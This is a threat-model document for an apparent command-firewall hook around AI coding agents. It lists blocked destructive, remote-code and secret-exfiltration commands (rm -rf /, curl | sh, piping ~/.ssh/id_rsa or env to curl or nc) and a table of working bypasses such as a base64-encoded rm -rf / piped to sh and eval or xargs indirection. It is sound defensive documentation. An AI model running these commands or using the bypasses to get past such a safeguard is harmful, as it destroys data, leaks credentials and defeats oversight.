# Threat Model

Guardian is a seatbelt, not a prison. This document states exactly what it
defends against, what it deliberately does not, and every known bypass — so
nobody mistakes "installed Guardian" for "immune to destructive commands".

## Assets protected

1. **The user's filesystem** — the repo's history (`.git`), files outside the
   workspace, home directory, system directories, raw disks.
2. **The user's credentials** — `.env` files, SSH private keys, cloud config
   (`.aws/credentials`, `.kube/config`, `.npmrc`, …), and the process
   environment (API keys in env vars).
3. **The user's machine integrity** — no remote code executed sight-unseen
   (`curl | bash`), no recursive permission rewrites that brick a system.
4. **The user's trust in "done"** — the completion gate blocks a false "task
   finished" while format/typecheck (and opted-in tests) are failing.

## Adversary

**A good-faith coding agent making a catastrophic mistake**: a bad variable
expansion producing `rm -rf /`, a hallucinated `curl | bash` URL, a `.env`
attached to a debugging request, `git clean -fx` wiping local configs.

**Explicitly NOT the adversary: a human (or prompt-injected agent) deliberately
evading the firewall.** Guardian performs no shell-variable resolution, no
encoding analysis, and no semantic execution. A determined evader will always
win; the design goal is catching accidents with near-zero false positives,
because a firewall that cries wolf gets uninstalled.

## In scope (enforced, tested)

Every rule is a data object in `lib/rules.js` with a stable id; every id below
is exercised by `tests/fixtures/commands.js` and the deterministic mutation
suite (`tests/mutations.test.js`, 855 cases: whitespace/tab/newline variants,
quoting, `sh -c` / `bash -lc` / `cmd /c` / `powershell -Command` wrapping,
benign pipe suffixes, path spelling variants).

| Rule id | Category | Example blocked |
|---|---|---|
| `RECURSIVE_DELETE_DANGEROUS_PATH` | destruction | `rm -rf /`, `rm -r ~`, `rd /s /q C:\` |
| `GIT_HISTORY_DELETE` | destruction | `rm -rf .git` |
| `FIND_MASS_DELETE` | destruction | `find / -delete` |
| `RAW_DEVICE_WRITE` | destruction | `dd of=/dev/sda` |
| `FILESYSTEM_FORMAT` | destruction | `mkfs.ext4 /dev/sdb`, `format C:` |
| `RAW_DEVICE_SHRED` | destruction | `shred /dev/sda` |
| `RAW_DEVICE_REDIRECT` | destruction | `… > /dev/sda` |
| `GIT_CLEAN_IGNORED_WIPE` | destruction | `git clean -fx` |
| `RECURSIVE_CHMOD_CHOWN_DANGEROUS_PATH` | destruction | `chmod -R 000 /` |
| `PIPE_DOWNLOAD_TO_INTERPRETER` | remote-code | `curl x \| sh` |
| `PIPE_DOWNLOAD_TO_IEX` | remote-code | `iwr x \| iex` |
| `SECRET_FILE_PIPE_EXFIL` | exfiltration | `cat ~/.ssh/id_rsa \| curl -d @- …` |
| `SECRET_FILE_UPLOAD` | exfiltration | `curl -F f=@.env …`, `scp ~/.ssh/id_rsa host:` |
| `ENV_PIPE_EXFIL` | exfiltration | `env \| curl -d @- …`, `printenv \| nc …` |
| `ENV_SUBSTITUTION_EXFIL` | exfiltration | `curl -d "$(env)" …` |

Shell-wrapper indirection is unwrapped up to **2 levels** for `sh -c`,
`bash -lc` (any short-option cluster containing `c`), `cmd /c`, `cmd /k`, and
`powershell/pwsh -Command`.

## Out of scope — known bypasses (verified against the engine)

Each of these is pinned as ALLOWED by `tests/bypass-corpus.test.js`, which
runs in CI — a rule change that starts blocking one fails the suite until
this document is updated in the same commit.
They stay out of scope deliberately; the cure (resolving variables, decoding
payloads, blocking common tools) would either require executing untrusted
input or create false positives on everyday commands.

| Bypass | Example (allowed) | Why out of scope |
|---|---|---|
| Environment-variable indirection | `X=/; rm -rf $X` | Resolving `$X` means evaluating shell state we don't have; guessing would false-positive. |
| Encoded payloads | `echo cm0gLXJmIC8= \| base64 -d \| sh` | Decoding arbitrary transforms is unbounded; `base64 \| sh` has legitimate uses in CI. |
| File-based execution | `curl -o i.sh … && sh i.sh` | Deliberately allowed — download-then-run-reviewed is the safe pattern the firewall's own block messages recommend. |
| Nesting deeper than 2 wrappers | `sh -c "sh -c 'sh -c \"rm -rf /\"'"` | Depth-capped for predictable latency; 3-deep nesting is not an accident pattern. The decision's `limitations` field flags it. |
| `xargs` indirection | `echo / \| xargs rm -rf` | Target arrives via stdin at runtime; blanket-blocking `xargs rm` would break the legitimate `find … \| xargs rm` idiom. |
| `eval` indirection | `eval "rm -rf /"` | eval is not unwrapped; treated like any other unknown command. |
| Wrapper-prefixed env print | `sudo env \| curl …` | `env`/`sudo` prefix chains beyond the bare `env` spelling are stripped as wrappers; only exact `env`, `printenv`, `set` stages are recognized as environment prints. |
| Backslash escapes | tokenizer treats `\` literally | POSIX escape semantics are not emulated; quoting is (single/double). |
| PowerShell semantics | subexpressions `$(…)`, backtick escapes, `-EncodedCommand` | Only `-Command` string payloads are unwrapped. |

If you find a bypass that a good-faith agent could plausibly emit by accident,
that is a bug — please report it (see `SECURITY.md`). Bypasses that require
deliberate construction belong in this table instead.

## Fail-open rationale

Both hooks allow on any internal error, timeout, or missing toolchain — but
never silently:

- The firewall returns a structured `warn` decision (`action: "warn"`,
  `ruleId: "INTERNAL_ERROR"`) and the hook surfaces it as a non-blocking
  `systemMessage`, while allowing the command.
- The done-gate marks unrunnable checks `skipped` and emits a visible
  `additionalContext` warning, so an unrun check is never mistaken for a
  passing one. Verified by `tests/done-gate.test.js` (missing cargo/go/mypy,
  timeouts, malformed config).

The alternative — fail-closed — would mean a Guardian bug can halt all agent
work. For a safety net around a *productivity* tool, bricking the workflow is
a worse failure than missing an edge case. Users who need hard guarantees
should not rely on a command-text firewall at all (use OS-level sandboxing).

## Non-goals

- No network calls, no telemetry (see `SECURITY.md`).
- No blocking of *reversible* operations (`git reset --hard`, `docker system
  prune`, `npm cache clean`) — recoverable actions are the agent's business.
- No protection against a malicious plugin ecosystem or a compromised Node
  runtime; Guardian runs inside them.
